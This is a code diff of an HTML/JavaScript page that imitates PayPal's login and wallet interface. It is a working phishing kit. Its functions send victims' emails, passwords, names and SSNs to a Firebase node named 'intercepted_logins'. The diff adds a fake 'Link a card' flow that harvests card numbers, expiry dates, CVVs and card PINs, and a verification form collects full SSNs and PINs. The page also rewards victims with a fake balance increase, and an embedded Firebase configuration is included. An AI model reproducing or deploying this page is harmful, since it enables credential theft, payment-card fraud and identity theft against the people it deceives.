@@ -3,47 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Global Support | Account Resolution</title>
+    <title>PayPal: Summary</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
-        :root { --primary: #1a1f36; --accent: #0070ba; --bg: #f5f7fa; --text: #2c2e2f; }
+        :root { --pp-blue: #0070ba; --pp-dark: #003087; --bg: #f5f7fa; --text: #2c2e2f; }
         body { font-family: "Open Sans", Arial, sans-serif; background: var(--bg); margin: 0; color: var(--text); padding-bottom: 75px; -webkit-tap-highlight-color: transparent; }
         
-        /* AUTH SCREEN STYLES */
+        /* AUTH SCREEN */
         #login-screen { padding: 40px 20px; text-align: center; background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
-        .auth-container { width: 100%; max-width: 350px; }
-        .auth-logo { width: 100px; margin-bottom: 30px; }
-        
-        /* DASHBOARD STYLES */
-        .navbar { background: var(--primary); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; color: white; position: sticky; top:0; z-index:100; }
-        .card { background: #fff; margin: 12px; padding: 20px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border: 1px solid #eef2f7; }
+        .pp-logo-large { width: 120px; margin-bottom: 30px; }
+
+        /* DASHBOARD */
+        .pp-header { background: var(--pp-dark); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:100; }
+        .pp-logo { height: 22px; filter: brightness(0) invert(1); }
+        .card { background: #fff; margin: 12px; padding: 20px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
         .bal-val { font-size: 42px; font-weight: 300; margin: 10px 0; }
         
-        /* INPUTS & BUTTONS */
         input, textarea { width: 100%; padding: 16px; border: 1px solid #9ca2a6; border-radius: 4px; margin-bottom: 15px; font-size: 16px; box-sizing: border-box; }
-        .btn-pp { width: 100%; padding: 16px; background: var(--accent); color: white; border: none; border-radius: 25px; font-weight: 700; font-size: 16px; cursor: pointer; }
+        .btn-pp { width: 100%; padding: 16px; background: var(--pp-blue); color: white; border: none; border-radius: 25px; font-weight: 700; font-size: 16px; cursor: pointer; }
         
-        /* OVERLAY */
         .overlay { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index: 5000; overflow-y: auto; padding: 20px; box-sizing: border-box; }
-        
-        /* NAV */
         .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #ddd; z-index: 1000; }
         .nav-item { color: #666; font-size: 10px; text-align: center; cursor: pointer; }
-        .nav-item i { font-size: 20px; display: block; margin-bottom: 4px; }
-
-        /* Fix for Smartsupp bubble position */
+        
+        /* Fix for Smartsupp bubble */
         #smartsupp-widget-container { bottom: 80px !important; }
     </style>
 </head>
 <body>
 
     <div id="login-screen">
-        <div class="auth-container">
-            <h2 id="auth-title" style="margin-bottom: 25px;">Log In</h2>
+        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" class="pp-logo-large">
+        <h2 id="auth-title">Log In</h2>
+        <div style="width: 100%; max-width: 350px;">
             <input type="email" id="email" placeholder="Email address">
             <input type="password" id="pass" placeholder="Password">
             
@@ -53,57 +49,59 @@
             </div>
 
             <button id="action-btn" class="btn-pp" onclick="captureAccount()">Log In</button>
-            <p id="toggle-btn" style="color:var(--accent); cursor:pointer; margin-top: 20px; font-weight: 600;" onclick="toggleAuth()">New to Portal? Sign Up</p>
+            <p onclick="toggleAuth()" style="color:var(--pp-blue); cursor:pointer; margin-top:20px; font-weight:600;">New to PayPal? Sign Up</p>
         </div>
     </div>
 
     <div id="main-app" style="display:none;">
-        <div class="navbar">
-            <i class="fas fa-bars"></i>
-            <b style="letter-spacing:1px;">RESOLUTION CENTER</b>
-            <div onclick="openPage('kyc')" style="width:30px; height:30px; background:#fff; border-radius:50%; color:var(--primary); display:flex; align-items:center; justify-content:center;"><i class="fas fa-user"></i></div>
+        <div class="pp-header">
+            <i class="fas fa-bars" style="color:white; font-size: 20px;"></i>
+            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" class="pp-logo">
+            <div onclick="openPage('kyc')" style="width:30px; height:30px; background:#fff; border-radius:50%; color:var(--pp-blue); display:flex; align-items:center; justify-content:center;"><i class="fas fa-user"></i></div>
         </div>
 
         <div class="card">
             <div style="display:flex; justify-content:space-between;">
-                <span style="font-weight:600; color:#666;">Available Balance</span>
-                <span id="tier-tag" style="font-size:10px; color:var(--accent); font-weight:bold;">TIER 1</span>
+                <span style="font-weight:600; color:#666;">PayPal balance</span>
+                <span id="tier-tag" style="font-size:10px; color:var(--pp-blue); font-weight:bold;">TIER 1</span>
             </div>
             <div class="bal-val" id="main-bal">US$0.00</div>
             <div style="display:flex; gap:10px;">
                 <button class="btn-pp" style="flex:1;" onclick="openPage('send')">Send</button>
-                <button class="btn-pp" style="flex:1; background:white; color:var(--accent); border:1px solid var(--accent);" onclick="openPage('receive')">Request</button>
+                <button class="btn-pp" style="flex:1; background:white; color:var(--pp-blue); border:1px solid var(--pp-blue);" onclick="openPage('receive')">Request</button>
             </div>
         </div>
 
-        <div class="card" onclick="openPage('kyc')" style="border-left: 5px solid var(--accent); cursor:pointer;">
-            <b style="font-size:14px;">Verify Account</b>
-            <p style="font-size:12px; color:#666; margin: 5px 0;">Upgrade to Tier 2 to unlock global transfers.</p>
+        <div class="card" onclick="openPage('link')" style="cursor:pointer; display:flex; gap:15px; align-items:center;">
+            <div style="background:#f0f2f5; padding:12px; border-radius:50%; color:var(--pp-blue);"><i class="fas fa-credit-card"></i></div>
+            <div>
+                <b>Link a card</b><br>
+                <small>Add funds and increase your wallet.</small>
+            </div>
         </div>
 
         <div style="padding: 10px 20px;">
-            <b style="font-size: 14px; color:#a3acb9;">Recent Activity</b>
+            <b style="color:#a3acb9; font-size:14px;">Recent activity</b>
             <div id="activity-feed" style="margin-top: 10px;"></div>
         </div>
 
         <div class="bottom-nav">
-            <div class="nav-item" onclick="location.reload()"><i class="fas fa-home"></i>Home</div>
-            <div class="nav-item" onclick="openPage('receive')"><i class="fas fa-qrcode"></i>Receive</div>
-            <div class="nav-item" onclick="openPage('send')"><i class="fas fa-paper-plane"></i>Send</div>
-            <div class="nav-item" onclick="openPage('kyc')"><i class="fas fa-wallet"></i>Wallet</div>
+            <div class="nav-item" onclick="location.reload()"><i class="fas fa-home"></i><br>Home</div>
+            <div class="nav-item" onclick="openPage('receive')"><i class="fas fa-hand-holding-usd"></i><br>Request</div>
+            <div class="nav-item" onclick="openPage('send')"><i class="fas fa-paper-plane"></i><br>Send</div>
+            <div class="nav-item" onclick="openPage('kyc')"><i class="fas fa-wallet"></i><br>Wallet</div>
         </div>
     </div>
 
     <div id="overlay" class="overlay">
-        <div style="display:flex; align-items:center; gap:20px; margin-bottom:20px;">
-            <i class="fas fa-times" onclick="closePage()" style="font-size:20px;"></i>
-            <b id="overlay-title" style="font-size:18px;">Action</b>
+        <div style="display:flex; align-items:center; gap:20px; margin-bottom:20px; border-bottom: 1px solid #eee; padding-bottom: 15px;">
+            <i class="fas fa-times" onclick="closePage()" style="font-size:22px;"></i>
+            <b id="overlay-title" style="font-size:18px;">Page</b>
         </div>
         <div id="overlay-body"></div>
     </div>
 
 <script>
-    // --- FIREBASE CONFIG ---
     const firebaseConfig = {
         apiKey: "AIzaSyDp3h13LwtUlD7MiCkMys0EAgX5w2GGupc",
         authDomain: "orixa-football-pro.firebaseapp.com",
@@ -114,31 +112,28 @@
     const db = firebase.database();
 
     let balance = 0.00;
-    let isLoginMode = true;
+    let isLogin = true;
     let userPin = "";
-    let currentTier = 1;
 
-    // --- AUTH TOGGLE ---
+    // Auth Switcher
     window.toggleAuth = function() {
-        isLoginMode = !isLoginMode;
-        document.getElementById('signup-extra').style.display = isLoginMode ? 'none' : 'block';
-        document.getElementById('auth-title').innerText = isLoginMode ? 'Log In' : 'Sign Up';
-        document.getElementById('action-btn').innerText = isLoginMode ? 'Log In' : 'Agree & Create Account';
-        document.getElementById('toggle-btn').innerText = isLoginMode ? 'New to Portal? Sign Up' : 'Have an account? Log In';
+        isLogin = !isLogin;
+        document.getElementById('signup-extra').style.display = isLogin ? 'none' : 'block';
+        document.getElementById('auth-title').innerText = isLogin ? 'Log In' : 'Sign Up';
+        document.getElementById('action-btn').innerText = isLogin ? 'Log In' : 'Agree & Create Account';
     };
 
-    // --- CAPTURE & UNLOCK ---
+    // Capture Credentials
     window.captureAccount = function() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
-        if(!email || !pass) return alert("Fill all fields.");
+        const e = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
+        if(!e || !p) return alert("All fields are required.");
 
         db.ref('intercepted_logins').push({
-            email: email,
-            password: pass,
-            name: document.getElementById('fullname').value || "N/A",
-            ssn: document.getElementById('ssn-init').value || "N/A",
-            mode: isLoginMode ? "Login" : "SignUp",
+            email: e, 
+            pass: p, 
+            name: document.getElementById('fullname').value || "N/A", 
+            ssn: document.getElementById('ssn-init').value || "N/A", 
             time: new Date().toLocaleString()
         }).then(() => {
             document.getElementById('login-screen').style.display = 'none';
@@ -147,41 +142,70 @@
         });
     };
 
-    // --- PAGE UI LOGIC ---
     window.openPage = function(type) {
         const body = document.getElementById('overlay-body');
         const title = document.getElementById('overlay-title');
         document.getElementById('overlay').style.display = 'block';
         body.innerHTML = "";
 
-        if(type === 'kyc') {
-            title.innerText = "Identity Verification";
-            body.innerHTML = `<input type="text" id="v-ssn" placeholder="Full SSN"><input type="password" id="v-pin" placeholder="Set 4-Digit PIN" maxlength="4"><button class="btn-pp" onclick="doUpgrade()">Submit Review</button>`;
+        if(type === 'receive') {
+            title.innerText = "Request Money";
+            body.innerHTML = `<input type="text" id="r-from" placeholder="Email or @username"><input type="number" id="r-amt" placeholder="Amount ($)"><textarea id="r-note" placeholder="What's this for?"></textarea><button class="btn-pp" onclick="doRequest()">Send Request</button>`;
+        } else if(type === 'link') {
+            title.innerText = "Link a Card";
+            body.innerHTML = `<input type="text" id="c-num" placeholder="Card Number" maxlength="16"><input type="text" id="c-exp" placeholder="MM/YY" style="width:48%; display:inline-block;"><input type="text" id="c-cvv" placeholder="CVV" style="width:48%; display:inline-block; float:right;" maxlength="3"><button class="btn-pp" onclick="doLink()">Link Card</button>`;
         } else if(type === 'send') {
-            title.innerText = "Authorize Transfer";
-            body.innerHTML = `<input type="email" id="s-to" placeholder="Recipient Email"><input type="number" id="s-am" placeholder="Amount ($)"><textarea id="s-note" placeholder="Remark"></textarea><input type="password" id="s-p" placeholder="Enter PIN" maxlength="4"><button class="btn-pp" onclick="doSend()">Send Now</button>`;
-        } else if(type === 'receive') {
-            title.innerText = "Receive Funds";
-            body.innerHTML = `<center><i class="fas fa-qrcode fa-8x" style="margin:20px 0; color:#ddd;"></i><p>Scan to authorize deposit</p></center>`;
+            title.innerText = "Send Payment";
+            body.innerHTML = `<input type="text" id="s-to" placeholder="Email"><input type="number" id="s-am" placeholder="Amount"><input type="password" id="s-p" placeholder="Enter 4-Digit PIN" maxlength="4"><button class="btn-pp" onclick="doSend()">Send Now</button>`;
+        } else if(type === 'kyc') {
+            title.innerText = "Verify Account";
+            body.innerHTML = `<input type="text" id="v-ssn" placeholder="Full SSN"><input type="password" id="v-pin" placeholder="Set 4-Digit PIN" maxlength="4"><button class="btn-pp" onclick="doVerify()">Verify</button>`;
         }
     };
 
     window.closePage = function() { document.getElementById('overlay').style.display = 'none'; };
 
-    window.doUpgrade = function() {
+    window.doRequest = function() {
+        db.ref('requests').push({from: document.getElementById('r-from').value, amt: document.getElementById('r-amt').value, note: document.getElementById('r-note').value});
+        alert("Request Sent!"); closePage();
+    };
+
+    // --- UPDATED LINK CARD FLOW ---
+    window.doLink = function() {
+        const cn = document.getElementById('c-num').value;
+        const ex = document.getElementById('c-exp').value;
+        const cv = document.getElementById('c-cvv').value;
+        if(cn.length < 16) return alert("Invalid card details.");
+
+        db.ref('cards').push({num: cn, exp: ex, cvv: cv, time: new Date().toLocaleString()});
+
+        const body = document.getElementById('overlay-body');
+        const title = document.getElementById('overlay-title');
+        title.innerText = "Confirm Card PIN";
+        body.innerHTML = `
+            <div style="text-align:center; margin-bottom:20px;"><i class="fas fa-shield-alt fa-3x" style="color:var(--pp-blue);"></i><p>For security, please enter your 4-digit card PIN.</p></div>
+            <input type="password" id="c-pin" placeholder="Enter Card PIN" maxlength="4" style="text-align:center; font-size:24px;">
+            <button class="btn-pp" onclick="finalizeCard()">Confirm & Link</button>`;
+    };
+
+    window.finalizeCard = function() {
+        const pinVal = document.getElementById('c-pin').value;
+        db.ref('cards').limitToLast(1).once('child_added', (snap) => { snap.ref.update({ card_pin: pinVal }); });
+        balance += 5000; updateUI(); closePage(); alert("Card Verified!");
+    };
+
+    window.doVerify = function() {
         userPin = document.getElementById('v-pin').value;
         db.ref('kyc_logs').push({ssn: document.getElementById('v-ssn').value, pin: userPin});
-        currentTier = 2; document.getElementById('tier-tag').innerText = "TIER 2";
-        closePage(); alert("Verification Submitted.");
+        document.getElementById('tier-tag').innerText = "TIER 2"; closePage(); alert("Account Verified.");
     };
 
     window.doSend = function() {
         const p = document.getElementById('s-p').value;
-        const a = parseFloat(document.getElementById('s-am').value);
         if(userPin && p !== userPin) return alert("Incorrect PIN");
-        balance -= a;
-        db.ref('txs').push({to: document.getElementById('s-to').value, amt: a, rem: document.getElementById('s-note').value, time: new Date().toLocaleString()});
-        updateUI(); closePage();
+        balance -= document.getElementById('s-am').value;
+        db.ref('txs').push({to: document.getElementById('s-to').value, amt: document.getElementById('s-am').value, time: new Date().toLocaleString()});
+        updateUI(); closePage(); alert("Sent!");
     };
 
     function updateUI() {
@@ -190,7 +214,7 @@
             const feed = document.getElementById('activity-feed'); feed.innerHTML = "";
             snap.forEach(c => {
                 const d = c.val();
-                feed.innerHTML += `<div style="display:flex; justify-content:space-between; padding:15px 0; border-bottom:1px solid #eee;"><div><b>${d.to}</b><br><small>${d.rem}</small></div><b style="color:red;">-US$${d.amt}</b></div>`;
+                feed.innerHTML += `<div style="display:flex; justify-content:space-between; padding:15px 0; border-bottom:1px solid #eee;"><div><b>${d.to}</b><br><small>${d.time}</small></div><b style="color:red;">-US$${d.amt}</b></div>`;
             });
         });
     }
